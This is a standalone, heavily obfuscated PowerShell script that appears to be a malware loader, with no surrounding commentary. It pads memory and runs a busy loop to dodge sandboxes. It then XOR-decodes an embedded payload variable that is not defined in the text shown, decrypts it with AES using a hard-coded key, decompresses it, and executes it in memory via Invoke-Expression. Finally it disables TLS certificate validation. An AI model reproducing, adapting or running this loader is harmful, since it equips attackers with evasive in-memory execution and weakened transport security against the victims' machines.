$jopvitrstqoou = (Get-Process -Id $PID | Select-Object Name,@{Name="WorkingSet";Expression={($_.ws / 1024kb)}}).WorkingSet
if ($jopvitrstqoou -lt 250) { $mrjpnvyhkrmzyk = "a" * 300MB }
$uvpxnootqwmvuwy = 0
$oprxgypkspj = 30000000
For ($uvpxnootqwmvuwy=0; $uvpxnootqwmvuwy -lt $oprxgypkspj;$uvpxnootqwmvuwy++) { $uvpxnootqwmvuwy++ }
$hkohrhpgkyinkmhm = [System.Text.Encoding]::UTF8.GetBytes("jrwvzjupqyk")
$juyzivgpgiq = [System.Text.Encoding]::UTF8.GetBytes($osthhrtjovqqo)
$iwrsnyiopptk = $(for ($zhgxhkquwz = 0; $zhgxhkquwz -lt $juyzivgpgiq.length; ) {
    for ($trwzikmzrokrsxghi = 0; $trwzikmzrokrsxghi -lt $hkohrhpgkyinkmhm.length; $trwzikmzrokrsxghi++) {
        $juyzivgpgiq[$zhgxhkquwz] -bxor $hkohrhpgkyinkmhm[$trwzikmzrokrsxghi]
        $zhgxhkquwz++
        if ($zhgxhkquwz -ge $juyzivgpgiq.Length) {
            $trwzikmzrokrsxghi = $hkohrhpgkyinkmhm.length
        }
    }
})
$iwrsnyiopptk = [System.Text.Encoding]::UTF8.GetString($iwrsnyiopptk)
$yhqujtyioikjtsj = "$iwrsnyiopptk"
$nnkytwuipqiwyqux = $yhqujtyioikjtsj.ToCharArray()
[array]::Reverse($nnkytwuipqiwyqux)
$vhyvqwsjiygvtntpp = -join($nnkytwuipqiwyqux)
$rmommimnqi = [System.Convert]::FromBase64String("$vhyvqwsjiygvtntpp")
$ymvgkqtpoxipqgvh = [System.Convert]::FromBase64String("Ry4LyJ8byHd5GkQ8gzMoz6KnhgD5UTD5WTldiLonTKY=")
$jxrnmsopqnoguxim = "==gCkV2Zh5WYNNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3U"
$qgzginpzzjwz = $jxrnmsopqnoguxim.ToCharArray()
[array]::Reverse($qgzginpzzjwz)
$ouymghhkuqisz = -join($qgzginpzzjwz)
$rgnxrxomvo = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ouymghhkuqisz))
$suswkqjkkxvhi = New-Object "$rgnxrxomvo"
$pygqstprgxg = "==gQDVkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
$jqysguynmjorsn = $pygqstprgxg.ToCharArray()
[array]::Reverse($jqysguynmjorsn)
$nrvuozhtzkyot = -join($jqysguynmjorsn)
$okomvjouhx = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($nrvuozhtzkyot))
$jynpguhsxgpp = & ([scriptblock]::Create($okomvjouhx))
$suswkqjkkxvhi.Mode = $jynpguhsxgpp
$isxugnrpgqpn = "==wMykDWJNlTBpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
$ipmznnivivwmuvp = $isxugnrpgqpn.ToCharArray()
[array]::Reverse($ipmznnivivwmuvp)
$wvkpsqwotkwinxt = -join($ipmznnivivwmuvp)
$ywrrttwvvjov = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($wvkpsqwotkwinxt))
$ryjpuvuptskxn = & ([scriptblock]::Create($ywrrttwvvjov))
$suswkqjkkxvhi.Padding = $ryjpuvuptskxn
$suswkqjkkxvhi.BlockSize = 128
$suswkqjkkxvhi.KeySize = 256
$suswkqjkkxvhi.Key = $ymvgkqtpoxipqgvh
$suswkqjkkxvhi.IV = $rmommimnqi[0..15]
$zxnjjsyhohgh = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLk1lbW9yeVN0cmVhbQ=="))
$koukihoxixitox = New-Object $zxnjjsyhohgh(,$suswkqjkkxvhi.CreateDecryptor().TransformFinalBlock($rmommimnqi,16,$rmommimnqi.Length-16))
$sxnnkxmiytmziqrr = New-Object $zxnjjsyhohgh
$hpnvynkxxttz = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVjb21wcmVzcw=="))
$ijrkoontwxsqvmhh = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV0="))))
$rpqstmhtkuivtxk = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0="))
$qiwtyumhosj = New-Object $rpqstmhtkuivtxk $koukihoxixitox, ($ijrkoontwxsqvmhh::$hpnvynkxxttz)
$qiwtyumhosj.CopyTo($sxnnkxmiytmziqrr)
$qiwtyumhosj.Close()
$suswkqjkkxvhi.Dispose()
$koukihoxixitox.Close()
$ghiipmvmvuptuj = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5UZXh0LkVuY29kaW5nXQ=="))))
$oomunhsyuu = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVRGOA=="))
$wvptuprpgi = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9BcnJheQ=="))
$vrkzhyqtjnirts = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U3RyaW5n"))
$quzxmqrnzriqzs = $ghiipmvmvuptuj::$oomunhsyuu.$vrkzhyqtjnirts($sxnnkxmiytmziqrr.$wvptuprpgi())
Invoke-Expression($quzxmqrnzriqzs)
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }